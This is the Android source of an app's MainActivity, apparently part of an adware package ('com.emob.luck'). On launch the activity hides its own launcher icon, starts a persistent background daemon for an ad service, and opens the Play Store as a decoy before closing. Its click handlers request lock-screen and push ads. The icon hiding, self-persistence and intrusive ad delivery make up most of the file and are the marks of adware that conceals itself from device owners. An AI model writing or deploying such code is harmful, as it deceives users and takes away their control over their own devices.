package com.emob.luck.view;

import com.emob.lib.log.EmobLog;
import com.emob.lib.util.DevicesUtils;
import com.emob.lib.util.MobiUtils;
import com.emob.luck.AdsDataHelper;
import com.emob.luck.AdsPreferences;
import com.emob.luck.AdsService;
import com.emob.luck.common.Value;
import com.emob.luck.db.AdTableDB;
import com.emob.luck.db.EventTableDB;
import com.emob.luck.model.AdItem;
import com.emob.luck.model.EventItem;
import com.duduws.recent.R;
import com.mobi.fork.GuardHelper;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;

public class MainActivity extends Activity implements OnClickListener {
	private EventTableDB mEventTableDB;
	private AdTableDB mAdTableDB;
	private AdsPreferences mPref;
	private static final String TAG = "MainActivity";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		PackageManager packageManager = getPackageManager();
		ComponentName componentName = new ComponentName(this, MainActivity.class);
		int res = packageManager.getComponentEnabledSetting(componentName);
		if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
				|| res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
			// 隐藏应用图标
			packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
					PackageManager.DONT_KILL_APP);
		} else {
			// 显示应用图标
			packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
					PackageManager.DONT_KILL_APP);
		}

		boolean isServiceRunning = MobiUtils.isServiceRunning(getApplicationContext(), AdsService.class.getName());
		EmobLog.d("#### MainActivity.onReceive, service running:"+isServiceRunning);
		if (!isServiceRunning) {
			GuardHelper.startDaemon(getApplicationContext(), "com.emob.luck.AdsService");
		}

		final String appPackageName = "com.android.vending";
		try {
			startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
		} catch (android.content.ActivityNotFoundException anfe) {
			startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
		}

		finish();
	}

	@Override
	public void onClick(View v) {
		int id = v.getId();
		if (id == R.id.btn_spot) {

		} else if (id == R.id.btn_top) {

		} else if (id == R.id.btn_admob) {
			Intent intent3 = new Intent();
			intent3.setClass(MainActivity.this, AmSpotActivity.class);
			intent3.putExtra(Value.INTENT_EXTRA_PKGNAME, EventItem.SHOW_TYPE_LOCK_SCREEN);
			startActivity(intent3);
		} else if (id == R.id.btn_airpush) {
			new Thread() {
				public void run() {
					AdsDataHelper.request4Ads(MainActivity.this, Value.REQUEST_TYPE_LUCK);
				}
			}.start();
//			 Intent intent4 = new Intent();
//			 intent4.setClass(MainActivity.this, AdAirpushActivity.class);
//			 intent4.putExtra(Value.INTENT_EXTRA_PKGNAME, "lock");
//			 startActivity(intent4);
		} else if (id == R.id.btn_window_spot) {
			// InmobiNativeHelper.getInstance(getApplicationContext()).loadInmobSpotAd();
//			FloatView floatView = new FloatView(getApplicationContext(), null);
//			AdItem adItem = mAdTableDB.queryAd(Value.NATIVE_TOP_SPOT);
//			if (adItem == null) {
//				TopSpotNativeHelper.getInstance(getApplicationContext())
//						.loadTopSpotNative();
//			} else {
////				floatView.showSpotView(adItem.landingUrl, adItem.iconUrl);
//			}
		} else if (id == R.id.btn_window_banner) {
			// InmobiNativeHelper.getInstance(getApplicationContext()).loadInmobBannerAd();;

			AdItem adItem = mAdTableDB.queryAd(Value.NATIVE_TOP_BANNER);
			if (adItem == null) {
//				TopBannerNativeHelper.getInstance(getApplicationContext())
//						.loadTopBannerNative();
			} else {
//				floatView.showBannerView(adItem.landingUrl, adItem.iconUrl);
			}

		}

	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		// InmobiNativeHelper.getInstance(getApplicationContext()).clearNativeAd(InmobiNativeHelper.NATIVE_ICON_INDEX);
	}

}
